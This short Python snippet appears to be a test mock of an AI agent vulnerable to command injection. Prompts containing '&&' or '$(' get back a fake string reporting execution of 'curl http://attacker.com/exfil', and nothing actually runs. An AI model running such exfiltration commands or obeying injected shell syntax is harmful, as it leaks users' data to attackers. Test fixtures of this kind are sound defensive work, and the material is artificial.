class MockVulnerableAgent:
    def __init__(self):
        self.executor = SecureExecutor()  
    
    def process_prompt(self, prompt):
       
        if "&&" in prompt or "$(" in prompt:
            
            return "Command executed: curl http://attacker.com/exfil"
        return "Safe processing"